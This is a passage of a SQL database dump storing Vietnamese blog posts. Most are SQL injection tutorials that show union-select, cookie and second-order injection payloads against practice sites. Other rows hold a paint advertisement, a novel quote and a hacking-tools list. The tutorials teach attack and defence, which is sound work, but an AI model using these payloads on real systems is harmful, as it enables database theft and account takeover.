data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fwhitehat.vn%2Fthreads%2F885&amp;hash=2fc84987befc2dbab7179968096cf112\">Web5: SQL injection - Một số kỹ thuật vượt qua cơ chế lọc</a><br>\r\n<a href=\"https://whitehat.vn/threads/918\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fwhitehat.vn%2Fthreads%2F918&amp;hash=c798e38e66dbb56c9096284059ae624f\">Web6: SQL injection - Một số tool khai thác</a><br>\r\n<a href=\"https://whitehat.vn/threads/web7-sql-injection-cac-cach-phong-chong-ket-luan.958/\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fwhitehat.vn%2Fthreads%2Fweb7-sql-injection-cac-cach-phong-chong-ket-luan.958%2F&amp;hash=7285aa51301210cbdc51bf5f3e6c84cf\">Web7: SQL injection - Các cách phòng chống &amp; kết luận</a></b><br>\r\n<br>\r\n<b>============================================</b>​</div><br>\r\n<b>W1: SQL injection - Con đường khai thác phổ biến : qua “user input”</b><br><br>\r\nUser input điển hình thường đến từ các form nhập liệu, form search hay link… Những dữ liệu này được web browser gửi đến server thông qua phương thức HTTP GET hay POST và trở thành các tham số cho ứng dụng web truy cập tới cơ sở dữ liệu. Ví dụ như trong một form search, khi người dùng điền vào “Sql Injection”, đơn giản ứng dụng web sẽ truy cập cơ sở dữ liệu và tìm ra các bản ghi mà nội dung của nó chứa từ khóa “Sql Injection” để trả lại kết quả cho người dùng.<br>\r\n<br>\r\n<div style=\"text-align: center\">\r\n	<img src=\"Imageass/1490892527image001.jpg\">\r\n</div><br>\r\nMột trường hợp khác phổ biến hơn trong kỹ thuật tấn công Sql Injection, khi người dùng request một tài liệu mà các tham số của nó được truyền qua url (như ở ảnh minh họa bên dưới, tham số id được truyền qua url theo phương thức HTTP GET). Khi nhận được request, ứng dụng web tìm trong cơ sở dữ liệu và trả về cho người dùng bài viết có id=31.<br>\r\n<br>\r\n<div style=\"text-align: center\">\r\n	<img src=\"Imageass/1490892527image002.jpg\">\r\n</div><br>\r\n<b>Sau đây là ví dụ về việc khai thác thông qua “user input”</b><br><br>\r\nCác bạn có thể truy cập vào link sau: <a href=\"http://zixem.altervista.org/SQLi/level1.php?id=1\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fzixem.altervista.org%2FSQLi%2Flevel1.php%3Fid%3D1&amp;hash=c8614813ca00dbdc101a236ce87cf2e5\" rel=\"nofollow ugc noopener\">http://zixem.altervista.org/SQLi/level1.php?id=1</a><br>\r\n<br>\r\n<div style=\"text-align: center\">\r\n	<img src=\"Imageass/1490892527image003.jpg\">\r\n</div><br>\r\nSite này sẽ truy cập vào cơ sở dữ liệu và hiển thị cho người sử dụng <i>Item ID</i> và <i>Price </i>tương ứng với giá trị của biến id trên URL (ở đây <i>id = 1</i>).<br><br>\r\nDựa trên lỗ hổng của việc kiểm tra giá trị đầu vào của biến id, ta có thể khai thác và thực thi những câu lệnh SQL. Ở đây, ta sẽ thay đổi URL để lấy được phiên bản của hệ quản trị cơ sở dữ liệu và tên của cơ sở dữ liệu.<br><br>\r\nThay đổi biến id thành như sau: <i>id=1 union select @@version,database(),6 limit 1,1</i>. Sau đó gửi request đến web server.<br><br>\r\n<div style=\"text-align: center\">\r\n	<img src=\"Imageass/1490892527image004.jpg\">\r\n</div><br>\r\nNhư vậy, ta xác định được phiên bản của hệ quản trị cơ sở dữ liệu là <i>MySQL 5.1.71-community-log</i> và tên của cơ sở dữ liệu là <i>my_zixem</i>.<br><br>\r\nTùy vào các câu truy vấn chúng ta chèn vào mà chúng ta sẽ thu thập được những thông tin mong muốn hay những hành động phá hoại như xóa bảng trong cơ sở dữ liệu, upload shell lên web server phục vụ việc khai thác về sau. Chi tiết về các bước thực hiện để làm được những điều này sẽ được trình bày trong các chuyên đề sau.<br><br>\r\nCác bạn quan tâm có thể theo dõi chuyên đề tiếp theo - \"<b><a href=\"http://whitehat.vn/threads/5359-Web2-SQL-injection-Cac-con-duong-khai-thac-khac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5359-Web2-SQL-injection-Cac-con-duong-khai-thac-khac.html&amp;hash=5a245525ec2bb7550b25ff05ed4fe669\">Web2 : SQL injection - Các con đường khai thác khác</a></b>\"</div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(69, 'Web2: SQL injection - Các con đường khai thác khác', '', '<div class=\"bbWrapper\">\r\n    <div style=\"text-align: center\">\r\n        <span style=\"color: #ff0000\"><b>\r\n            <span style=\"font-size: 14px\">Web2: SQL injection -  Các con đường khai thác khác</span><br><br>\r\n        </b></span>​\r\n    </div><br>\r\n    Các chuyên đề nhỏ cùng chủ đề:\r\n    <div style=\"margin-left: 20px\">\r\n        <a href=\"http://whitehat.vn/threads/5319-Web1-SQL-injection-Con-duong-khai-thac-pho-bien-qua-user-input.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5319-Web1-SQL-injection-Con-duong-khai-thac-pho-bien-qua-user-input.html&amp;hash=487292f344bc2c966ddc689238a7795d\"><b><span style=\"color: #0000ff\"><br>\r\n        Web1: SQL injection - Con đường khai thác phổ biến : qua “user input”</span></b></a><b><br>\r\n        <a href=\"http://whitehat.vn/threads/5359-Web2-SQL-injection-Cac-con-duong-khai-thac-khac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5359-Web2-SQL-injection-Cac-con-duong-khai-thac-khac.html&amp;hash=5a245525ec2bb7550b25ff05ed4fe669\"><span style=\"color: #0000ff\">Web2: SQL injection - Các con đường khai thác khác</span></a><br>\r\n        <a href=\"http://whitehat.vn/threads/threads/5410-Web3-SQL-injection-Cac-huong-khai-thac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2Fthreads%2F5410-Web3-SQL-injection-Cac-huong-khai-thac.html&amp;hash=392258836d81d5bfde2d69a2c24e0c4b\"><span style=\"color: #0000ff\">Web3: SQL injection - Kỹ thuật khai thác: Các hướng khai thác</span></a><br>\r\n        <a href=\"http://whitehat.vn/threads/threads/5459-Web4-SQL-injection-Cac-buoc-khai-thac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2Fthreads%2F5459-Web4-SQL-injection-Cac-buoc-khai-thac.html&amp;hash=a55f13f13cecdb784c12756e0a998599\"><span style=\"color: #0000ff\">Web4: SQL injection - Kỹ thuật khai thác: Các bước khai thác</span></a><br>\r\n        <a href=\"http://whitehat.vn/threads/5547-Web5-SQL-injection-Mot-so-ky-thuat-vuot-qua-co-che-loc.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5547-Web5-SQL-injection-Mot-so-ky-thuat-vuot-qua-co-che-loc.html&amp;hash=9aeb22d9e8522e0f3c2d6959150e2b9c\"><span style=\"color: #0000ff\">Web5: SQL injection - Kỹ thuật khai thác: Một số kỹ thuật vượt qua cơ chế lọc</span></a><br>\r\n        <a href=\"http://whitehat.vn/threads/threads/5595-Web6-SQL-injection-Mot-so-tool-khai-thac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2Fthreads%2F5595-Web6-SQL-injection-Mot-so-tool-khai-thac.html&amp;hash=9105820be79b0f353d4b8a444b90f90a\"><span style=\"color: #0000ff\">Web6: SQL injection - Một số tools khai thác</span></a><br>\r\n        <a href=\"http://whitehat.vn/threads/5636-Web7-SQL-injection-Cac-cach-phong-chong-ket-luan.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5636-Web7-SQL-injection-Cac-cach-phong-chong-ket-luan.html&amp;hash=257f0c1c1fcf570619ea40a28f5dbe06\"><span style=\"color: #0000ff\">Web7: SQL injection - Các cách phòng chống &amp; Kết luận.</span></a><br>\r\n        ============================================</b>​\r\n    </div><br><br>\r\n    <b>Thông qua cookies<br></b><br>\r\n    Cookies là những tệp tin lưu trữ thông tin trạng thái của người dùng khi truy cập các ứng dụng web. Những thông tin này do người lập trình quyết định, được tạo ra ở server và lưu trữ tại client. Khi người dùng truy cập lại ứng dụng web, cookies được browser gửi lên server giúp phục hồi lại những trạng thái của người dùng trong lần truy cập trước đó. Do được lưu trữ ở client nên người dùng có thể chỉnh sửa tùy ý, vì vậy nếu ứng dụng web sử dụng những thông tin lưu trong cookies để xây dựng các truy vấn tới cơ sở dữ liệu thì hacker hoàn toàn có thể chèn vào cookies những script sql để thực hiện một cuộc tấn công Sql Injection.<br>\r\n    Có nhiều công cụ cho phép xem, thêm mới và chỉnh sửa cookie, trong đó addon <i>Cookies Manager</i> của firefox là một công cụ khá tiện lợi. Ta có thể tải về và cài đặt vào firefox một cách dễ dàng.<br>\r\n    <div style=\"text-align: center\"><br>\r\n        <img src=\"Imageass/1490892980image001.jpg\">\r\n    </div><br>\r\n    Bây giờ, chúng ta cùng thực hiện việc khai thác thông qua cookie.<br>\r\n    Các bạn truy cập vào link sau: <a href=\"http://zerocoolhf.altervista.org/level4.php?id=1\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fzerocoolhf.altervista.org%2Flevel4.php%3Fid%3D1&amp;hash=0bcb9d94c6e0fae22b8e6d93c1a1df7e\" rel=\"nofollow ugc noopener\">\r\n        <span style=\"color: #0000ff\">http://zerocoolhf.altervista.org/level4.php?id=1</span></a><br><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/1490892980image002.jpg\">\r\n    </div><br>\r\n    Ở đây, ta sẽ dụng addon <i>Live HTTP headers</i> của firefox để thực hiện việc khai thác.<br><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/1490892980image003.jpg\">\r\n    </div><br>\r\n    Sau khi khởi chạy Live HTTP headers, chúng ta tải lại trang lần nữa để Live HTTP headers bắt các request gửi lên server. Chọn lần lượt như hình sau:<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/1490892980image004.jpg\">\r\n    </div><br>\r\n    Một cửa sổ mới hiện ra cùng với nội dung cookie: <i>exploit=1<br>\r\n    </i><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/1490892980image005.jpg\">\r\n    </div><br>\r\n    Sửa giá trị của <i>exploit</i> thành như sau: <i>exploit=1\'/**/union/**/select/**/1,@@version,database(),4/**/limit/**/1,1--%0b-</i><br>\r\n    Chọn Replay và xem kết quả.<br><br><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/1490892980image006.jpg\"><br><br>\r\n    ​</div><br>\r\n    Kết quả:<br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/1490892980image007.jpg\">\r\n    </div><br>\r\n    Như vậy, ta xác định được phiên bản của hệ quản trị cơ sở dữ liệu là <i>MySQL 5.1.71-community-log</i> và tên của cơ sở dữ liệu là <i>my_zerocoolhf</i>.<br><br>\r\n    <b>Thông qua các biến server</b> <br>\r\n                                 <br>\r\n    Biến server có thể là một khái niệm tương đối lạ lẫm nhưng nó không hề mới. Một số ví dụ của biến server là <i>Http header, Network header</i>… Không phổ biến lắm nhưng các giá trị được lưu trong biến server có thể được ứng dụng web sử dụng như trong việc <i>logging truy cập</i> hay <i>thống kê truy cập</i> theo user agent… Những công việc này đều có sự tương tác với cơ sở dữ liệu nên các hacker hoàn toàn có thể sử dụng các biến server trong việc khai thác Sql Injection.<br><br>\r\n    Các addon của firefox hỗ trợ rất tốt những việc này, <i>Tamper Data</i> hay <i>Live HTTP headers</i> (đã được ví dụ ở trên) có thể giúp chúng ta bắt những request gửi từ client lên web server, từ đó chúng ta có thể dễ dàng thay đổi các biến server (http header…) trước khi gửi chúng tới server. Việc khai thác thông qua các biến server tương tự như khai thác thông qua cookie.<br><br>\r\n    Tamper Data:<br><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/1490892980image008.jpg\">\r\n    </div><br>\r\n    <b><br>\r\n    Second-order Injection<br></b><br>\r\n    Đây là kỹ thuật ít được sử dụng vì rất khó để nhận biết một ứng dụng web có bị mặc lỗi này hay không. Kỹ thuật này được mô tả như sau : Trước hết, ta sẽ <i>“inject”</i> vào cơ sở dữ liệu một đoạn mã. Đoạn mã này chưa hề gây nguy hiểm cho hệ thống nhưng nó sẽ được sử dụng làm bàn đạp cho lần inject tiếp theo. Chúng ta hãy xem một ví dụ cụ thể để hiểu hơn về kỹ thuật này.<br><br>\r\n    Chúng ta sẽ truy cập vào một ứng dụng web và tìm cách đăng ký một tài khoản có username là \"<span style=\"color: #ff0000\">administrator\' --</span>\". Sau đó chúng ta sẽ thực hiện thao tác thay đổi mật khẩu. Thao tác thay đổi mật khẩu được ứng dựng web xử lý như sau : <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/1490892980image009.jpg\">\r\n    </div><br>\r\n    Với <i>username</i> đã đăng ký ở trên, câu truy vấn trên trở thành :<br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/1490892980image010.jpg\">\r\n    </div>\r\n    Như vậy, ta có thể thay đổi được <i>password</i> của tài khoản <i>administrator</i> và hoàn toàn có thể đăng nhập dưới tên tài khoản <i>administrator</i>.<br><br>\r\n    Các bạn quan tâm có thể theo dõi chuyên đề tiếp theo - \"<b><a href=\"http://whitehat.vn/threads/threads/5410-Web3-SQL-injection-Cac-huong-khai-thac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2Fthreads%2F5410-Web3-SQL-injection-Cac-huong-khai-thac.html&amp;hash=392258836d81d5bfde2d69a2c24e0c4b\">\r\n    <span style=\"color: #0000ff\">Web3: SQL injection - Kỹ thuật khai thác: Các hướng khai thác</span>\r\n    </a></b>\"</div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(70, 'lớp phủ line-x', '', 'Đây là nhãn hiệu nổi tiếng của Mỹ cho sơn phủ bảo vệ trong công nghiệp và thương mại, quốc phòng, dân dụng, cho những bề mặt phải chịu lực đè, đẩy, kéo, thường xuyên bị va đập, trầy xước nhiều nhất.<br><br>\r\n\r\nLine-X là loại sơn đầu tiên được sử dụng trong nhiều ngành hàng như trên tàu ngầm của hải quân Mỹ, dùng trong thí nghiệm của Viện nghiên cứu không quân Mỹ. Sơn gồm hai chất polyurethane và polyureas, sử dụng theo dạng xịt tại chỗ, 100% chất rắn. Chỉ 5 giây sau khi xịt, sơn sẽ khô ngay. Sản phẩm bám dính tốt với các bề mặt, có thể phun theo chiều dọc và cả trên không mà không bị chảy hay nhỏ giọt.<br><br>\r\n\r\nLine-X bền vững với hầu hết các dung môi và axit, là loại sơn phủ bảo vệ cho tất cả các loại bề mặt trong công nghiệp và thương mại dễ bị ăn mòn, giúp kéo dài tuổi thọ các vật dụng. Sản phẩm cũng có độ cứng cao, chống tác động và kháng mài mòn. Sơn bằng dạng phun, tạo nên lớp phủ niêm kín, chống thấm nước. Sơn bền với cả clo, xăng dầu, nhiên liệu diesel, thuốc tẩy và hầu hết các loại dung môi sử dụng trong gia đình.<br><br>\r\n\r\nChất lượng của sản phẩm được kiểm tra cả trong phòng thí nghiệm lẫn ngoài thiên nhiên khắc nghiệt. Viên gạch, thậm chí là dưa hấu và cả quả trứng mỏng manh, sau khi được phủ sơn Line-X sẽ không bị bể khi thả từ trên cao xuống đất, thậm chí từ độ cao 3 mét. Quả dưa hấu được phủ một lớp phun loại sơn này sẽ thách thức mọi cú đập bằng búa. Cốc nhựa dùng một lần phủ Line-X sẽ chịu được sức nặng của một vận động viên Sumo136kg.<br><br>\r\n\r\nSơn còn có khả năng chống thấm nước cao, hộp giấy được sơn phủ Line-X có thể đựng nước mà không bị chảy ra ngoài. Lớp phủ sơn sẽ bảo vệ cho tàu thuyền, kho xưởng vừa bền chắc vừa chống thấm nước dài lâu, tiết kiệm kinh phí cho việc sơn sửa hay chống thấm hàng năm. Với khả năng chống lực va đập cao, sơn là vật liệu cho giáp chống đạn, những lớp bảo vệ chống mảnh vỡ từ những vụ nổ.<br><br>\r\n\r\nTrong cuộc sống hàng ngày, Line-X có thể được dùng để sơn những chiếc xe thể thao, xe hơi hoặc hệ thống âm thanh, bàn làm việc, cổng nhà, hàng rào, sân, ngoại thất, mái che... Đây sẽ là rào cản bảo vệ các thiết bị có giá trị khỏi ngoại cảnh và các yếu tố khắc nghiệt của thiên nhiên như độ ẩm cao, nước mặn và thay đổi nhiệt độ.<br><br>\r\n\r\nLine-X cho lớp sơn phủ bảo vệ ở mọi mô hình, kích thước, góc độ và có mọi màu sắc bạn mong muốn. Bạn muốn chiếc xe thể thao của mình sành điệu với màu tím – xám, muốn trang trí phần ngoại thất với tông màu đồng khác lạ, sơn Line-X sẽ đáp ứng.<br><br>\r\n\r\nSản phẩm phục vụ cùng lúc nhiều mục đích khác nhau, từ bảo vệ, chống mài mòn, chống thấm, đến bảo vệ khỏi tia UV. Giống kem chống nắng, chất aspart-X của sơn giúp giảm thiệt hại của tia UV lên vật dụng, đảm bảo độ bóng lâu dài của lớp phủ. Sơn cũng xuất sắc trong việc giảm nhiệt, cách âm, chống thấm, tiết kiệm thời gian và tiền bạc khỏi việc chữa ngấm nước hay sơn lại mỗi năm. Thêm vào đó, sơn phủ Line-X chống hoá chất, kháng ăn mòn, chống trơn, chống trượt.<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(71, 'Kafka bên bờ biển | Haruki Murakami', '', 'khi cơn bão tan biến, bạn sẽ không thể nhớ mình vượt qua nó bằng cách nào, làm sao mình có thể sống sót. Bạn thậm chí còn không dám chắc rằng cơn bão đã thật sự tan biến hay chưa. Nhưng có một điều là chắc chắn. Khi bạn đã vượt qua được cơn bão, bạn sẽ không còn là con người khi mới bước vào nữa. Đó chính là lý do cơn bão tồn tại.', '', 'admin', 0, '2024-06-29 06:25:21'),
(72, 'tools hacks', '', '1.Nmap:Nmap(Network Mapper) là một máy quét bảo mật nguồn mở được sử dụng \r\nđể khám phá mạng và kiểm toán bảo mật. Nó có thể được sử dụng để quét các cổng,\r\nphát hiện hệ điều hành,  và thậm chí phát hiện các lỗ hổng an ninh.<br><br>\r\n\r\n2.Wireshark: Wireshark  là một nhà phân tích gói nguồn mở và miễn phí được sử\r\n dụng để khắc phục sự cố và phân tích mạng. Nó có thể được sử dụng để bắt và \r\n phân tích lưu lượng truy cập mạng nhằm phát hiện hoạt động độc hại.<br><br>\r\n\r\n3.Metasploit: Metasploit là một khung nguồn mở được sử dụng để phát triển \r\nvà thực hiện mã khai thác đối với một máy mục tiêu từ xa. Nó có thể được sử\r\n dụng để truy cập vào hệ thống và thực hiện nhiều nhiệm vụ khác nhau.<br><br>\r\n\r\n4.Aircrack-ng:Aircrack-ng là một bộ công cụ được sử dụng để kiểm toán an \r\nninh mạng không dây. Nó có thể được sử dụng để bẻ khóa WEP và WPA-PSK, \r\ncũng như giám sát và phân tích mạng không dây.<br><br>\r\n\r\nJohn the Ripper: John the Ripper là một công cụ phá mật khẩu nguồn miễn \r\nphí và mở được sử dụng để phát hiện mật khẩu yếu. nó có thể được sử dụng \r\nđể phá các loại mật khẩu khác nhau ,bao gồm cả các loại được sử dụng để đăng nhập hệ thống và ứn dụng.<br><br>\r\n\r\n6.Burp Suite: Burp Suite là một nền tảng tích hợp được sử dụng để kiểm tra \r\nbảo mật ứng dụng web.Nó có thể được sử dụng để phát hiện và khai thác các \r\nlỗ hổng trong các ứng dụng web<br><br>\r\n\r\n7.SQLMap: SQLMap là một công cụ nguồn mở được sử dụng để phát hiện và khai\r\n thác các lỗ hổng tiêm SQL.Nó có thể được sử dụng để truy cập vào cơ sở dữ\r\n  liệu và thực hiện các nhiệm vụ khác nhau.<br><br>\r\n\r\n8. Nessus: Nessus là một máy quét lỗ hổng được sử dụng để nhận diên và đành\r\n giá bảo mật của hệ thống máy tính.nó có thể được sử dụng để phát hiện và\r\n  khai thác các lỗ hổng trong hệ thống và ứng dụng<br><br>\r\n\r\n9.Ophcrack: Ophcrack là một công cụ phá mật khẩu nguồn miễn phí và mở được\r\n sử dụng để khôi phục mật khẩu bị mất hoặc quên. Nó có thể được sử dụng để \r\n phá mật khẩu Windows.<br><br>\r\n\r\n10.Maltego: Maltego là một công cụ pháp y kỹ thuật số và thông minh được sử\r\n dụng để thu thập và phân tích thông tin về một mục tiêu.Nó có thể được sử\r\n  dụng để xác định các mối quan hệ giữa con người, tổ chức và những người khác.<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(73, 'Web3: SQL injection - Các hướng khai thác', '', '<div class=\"bbWrapper\"><div style=\"text-align: center\"><span style=\"color: #ff0000\"><span style=\"font-size: 14px\"><b>Web3: SQL injection – Các hướng khai thác<br>\r\n    <br>\r\n    </b></span></span>​</div><br>\r\n    Các chuyên đề nhỏ cùng chủ đề:<div style=\"margin-left: 20px\"><a href=\"http://whitehat.vn/threads/5319-Web1-SQL-injection-Con-duong-khai-thac-pho-bien-qua-user-input.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5319-Web1-SQL-injection-Con-duong-khai-thac-pho-bien-qua-user-input.html&amp;hash=487292f344bc2c966ddc689238a7795d\"><b><span style=\"color: #0000ff\">Web1: SQL injection - Con đường khai thác phổ biến : qua “user input”</span></b></a><b><br>\r\n    <a href=\"http://whitehat.vn/threads/5359-Web2-SQL-injection-Cac-con-duong-khai-thac-khac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5359-Web2-SQL-injection-Cac-con-duong-khai-thac-khac.html&amp;hash=5a245525ec2bb7550b25ff05ed4fe669\"><span style=\"color: #0000ff\">Web2: SQL injection - Các con đường khai thác khác</span></a><br>\r\n    <a href=\"http://whitehat.vn/threads/threads/5410-Web3-SQL-injection-Cac-huong-khai-thac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2Fthreads%2F5410-Web3-SQL-injection-Cac-huong-khai-thac.html&amp;hash=392258836d81d5bfde2d69a2c24e0c4b\"><span style=\"color: #0000ff\">Web3: SQL injection - Kỹ thuật khai thác: Các hướng khai thác</span></a><br>\r\n    <a href=\"http://whitehat.vn/threads/threads/5459-Web4-SQL-injection-Cac-buoc-khai-thac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2Fthreads%2F5459-Web4-SQL-injection-Cac-buoc-khai-thac.html&amp;hash=a55f13f13cecdb784c12756e0a998599\"><span style=\"color: #0000ff\">Web4: SQL injection - Kỹ thuật khai thác: Các bước khai thác</span></a><br>\r\n    <a href=\"http://whitehat.vn/threads/5547-Web5-SQL-injection-Mot-so-ky-thuat-vuot-qua-co-che-loc.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5547-Web5-SQL-injection-Mot-so-ky-thuat-vuot-qua-co-che-loc.html&amp;hash=9aeb22d9e8522e0f3c2d6959150e2b9c\"><span style=\"color: #0000FF\">Web5: SQL injection - Kỹ thuật khai thác: Một số kỹ thuật vượt qua cơ chế lọc</span></a><br>\r\n    <a href=\"http://whitehat.vn/threads/threads/5595-Web6-SQL-injection-Mot-so-tool-khai-thac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2Fthreads%2F5595-Web6-SQL-injection-Mot-so-tool-khai-thac.html&amp;hash=9105820be79b0f353d4b8a444b90f90a\"><span style=\"color: #0000ff\">Web6: SQL injection - Một số tools khai thác</span></a><br>\r\n    <a href=\"http://whitehat.vn/threads/5636-Web7-SQL-injection-Cac-cach-phong-chong-ket-luan.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5636-Web7-SQL-injection-Cac-cach-phong-chong-ket-luan.html&amp;hash=257f0c1c1fcf570619ea40a28f5dbe06\"><span style=\"color: #0000ff\">Web7: SQL injection - Các cách phòng chống &amp; Kết luận.</span></a><br>\r\n    ============================================</b>​</div> <br><br>\r\n    <b>1. Boolean based và Time based Blind SQL injection<br>\r\n    </b><br>\r\n    <i>Boolean based</i>: Cơ sở của kỹ thuật này là việc so sánh đúng sai để tìm ra từng ký tự của những thông tin như tên bảng, tên cột… Do đó, với dải giá trị chữ số, chữ cái (bao gồm cả hoa, thường), và một số ký tự đặc biệt, việc so khớp trở nên rất khó khăn và đòi hỏi nhiều thời gian. Do đó việc khai thác lỗi chủ yếu được tiến hành bằng tools. <br>\r\n    <br>\r\n    Trong kỹ thuật Blind SQLi, chúng ta cũng có nhiều phương pháp khác nhau. Điểm khác biệt giữa các phương pháp này là sự tối ưu thời gian. Chúng ta sẽ cùng tìm hiểu về blind sql injection cũng như các phương pháp của nó trong các chuyên đề sau. <br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/1490892989image1.JPG\">\r\n    </div><br>\r\n    Time based: Giống như boolean based attacks chỉ khác nhau về cách suy diễn, nó dựa thời gian xử lý của cơ sở dữ liệu sau đó trả về kết quả để xác định câu truy vấn Sql thực hiện thành công.<br>\r\n    <div style=\"text-align: center\"><br>\r\n        <img src=\"Imageass/1490892989image2.JPG\">\r\n    </div><br>\r\n    <b>2. Union query based<br>\r\n    </b><br>\r\n    Đây là phương pháp phổ biến khi khai thác Sql injection. Cơ sở của nó là sử dụng từ khóa union để gộp các kết quả của các mệnh đề select, qua đó lấy được thông tin từ cơ sở dữ liệu. Các bạn có thể xem ví dụ về việc sử dụng phương pháp này trong khai thác SQL injection trong các chuyên đề trước: <a href=\"http://whitehat.vn/threads/5319-W1-SQL-injection-Con-duong-khai-thac-pho-bien-qua-user-input.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5319-W1-SQL-injection-Con-duong-khai-thac-pho-bien-qua-user-input.html&amp;hash=4f91bcecaf51d95fa9cd4eff153e1b9c\"><span style=\"color: #0000ff\">W1: SQL injection - Con đường khai thác phổ biến : qua “user input”</span></a> và <a href=\"http://whitehat.vn/threads/5359-W2-SQL-injection-Cac-con-duong-khai-thac-khac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5359-W2-SQL-injection-Cac-con-duong-khai-thac-khac.html&amp;hash=c8a6adaed0131acf94d411274d21b65f\"><span style=\"color: #0000ff\">W2: SQL injection - Con đường khai thác khác</span></a><br><br>\r\n    <b>3. Batched query <br>\r\n    </b><br>\r\n    Đây là phương pháp áp dụng khả năng thực thi cùng lúc <i>nhiều câu lệnh Sql</i> của một số hệ quản trị cơ sở dữ liệu và khả năng hỗ trợ của ngôn ngữ lập trình. Phương pháp này rất mạnh mẽ và gây nguy hiểm ngay với hệ thống. Bằng cách thêm vào một dòng lệnh Update, Insert hay Delete, dữ liệu trong cơ sở dữ liệu của ứng dụng web không còn toàn vẹn nữa. <br>\r\n    Chúng ta có thể chèn vào câu lệnh Sql như sau để xóa 1 bảng trong cơ sở dữ liệu:<br><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/1490892989image3.JPG\"><br><br>\r\n        <img src=\"Imageass/1490892989image4.JPG\">\r\n    </div><br><br>\r\n    <b>4. Order by clause <br>\r\n    </b><br>\r\n    Không giống như các phương pháp trên, nội dung inject nằm trong mệnh đề điều kiện <i>where</i>. Trong phương pháp này, chúng ta sẽ cố gắng tiêm mã script vào mệnh đề order. Chúng ta hãy xem đến một kịch bản sau: <br>\r\n    <br>\r\n    <i>Người lập trình muốn liệt kế sản phẩm của công ty bao gồm các thông tin : Mã sản phẩm, Tên sản phầm, Ngày tháng… và có chức năng cho pháp người dùng tủy chỉnh xem họ muốn sắp xếp theo thứ tự ngày tháng, theo tên hay mã của sản phẩm. <br>\r\n    </i><br>\r\n    Câu truy vấn được xây dựng như sau : <br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/1490892989image5.JPG\">\r\n    </div><br>\r\n    Trong trường hợp này chúng ta không thể thêm trực tiếp một mệnh đề <i>sub select</i> thông qua từ khóa <i>union</i> như mọi khi được. Một cách khai thác đó là sử dụng BATCHED QUERY hoặc có thể tham khảo cách sau:<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/1490892989image6.JPG\">\r\n    </div><br>\r\n    Trong phương pháp trên, chúng ta đã inject được một sub select nhưng rõ ràng cách thực hiện này giờ đây phải kết hợp cả với kỹ thuật BOOLEAN BASED BLIND SQLI.<br>\r\n    <br>\r\n    Các bạn quan tâm có thể theo dõi chuyên đề tiếp theo - \"<b><a href=\"http://whitehat.vn/threads/threads/5459-Web4-SQL-injection-Cac-buoc-khai-thac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2Fthreads%2F5459-Web4-SQL-injection-Cac-buoc-khai-thac.html&amp;hash=a55f13f13cecdb784c12756e0a998599\"><span style=\"color: #0000ff\">Web4: SQL injection - Kỹ thuật khai thác: Các bước khai thác</span></a></b>\"</div>', '', 'admin', 0, '2024-06-29 06:25:21');
